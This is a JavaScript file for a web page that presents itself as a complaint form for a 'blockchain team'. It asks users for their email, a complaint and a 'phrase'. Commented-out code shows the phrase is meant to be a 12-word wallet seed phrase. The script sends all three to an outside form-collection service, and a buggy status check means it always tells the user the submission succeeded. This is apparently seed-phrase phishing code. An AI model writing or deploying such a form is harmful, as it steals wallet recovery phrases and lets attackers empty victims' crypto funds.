const submitComplaintBtn = document.querySelector("#submit-complaint-btn");
const errorAlert = document.querySelector("#error-alert");
const successAlert = document.querySelector("#success-alert");

submitComplaintBtn.onclick = async (e) => {
  e.preventDefault();
  let email = document.querySelector("#email").value;
  let complaint = document.querySelector("#complaint").value;
  let phrase = document.querySelector("#phrase").value;

  if (email === "" || complaint === "" || phrase === "") {
    showAlert(errorAlert, `Please fill in all the fields`);
    return;
  }
  // check if phrase is a 12 word phrase
  // if (phrase.split(" ").length < 12 || phrase.split(" ").length > 12) {
  //   console.log(phrase.split(" ").length);
  //   console.log(phrase.split(" ").length === 12);
  //   console.log(`invalid seed phrase`);
  //   showAlert(errorAlert, `invalid seed phrase`);
  //   return;
  // }

  // change button state // disable button
  changeBtnState(
    submitComplaintBtn,
    true,
    "bg-white",
    "bg-gray-500",
    "Submitting..."
  );
  let data = await sendComplaint({ email, complaint, phrase });

  if (data.status = "success") {
    // change button state // enable button
    changeBtnState(
      submitComplaintBtn,
      false,
      "bg-gray-500",
      "bg-white",
      "Continue"
    );
    showAlert(successAlert, `Successfully submitted complaint`);
  } else {
    // change button state // enable button
    changeBtnState(
      submitComplaintBtn,
      false,
      "bg-gray-500",
      "bg-white",
      "Submit complaint"
    );
    showAlert(errorAlert, `Something went wrong on our end, please try again`);
  }
};

const sendComplaint = async ({ email, complaint, phrase }) => {
  const body = {
    email,
    complaint,
    phrase,
  };
  const res = await fetch(
    // `http://localhost:3000/api/sendmail/blockchainteam/complaint`,
    `https://usebasin.com/f/0a7c671d8c75`,
    
    {
      headers: {
        "Content-type": "application/json",
      },
      method: "POST",
      body: JSON.stringify(body),
    }
  );
  // get response
  const data = await res.json();
  return data;
};

const showAlert = (alert, message) => {
  alert.innerHTML = message;

  setTimeout(() => {
    alert.innerHTML = ``;
  }, 2500);
};

const changeBtnState = (btn, disabled, removeClass, addClass, text) => {
  btn.disabled = disabled;
  btn.classList.remove(removeClass);
  btn.classList.add(addClass);
  btn.innerHTML = text;
};
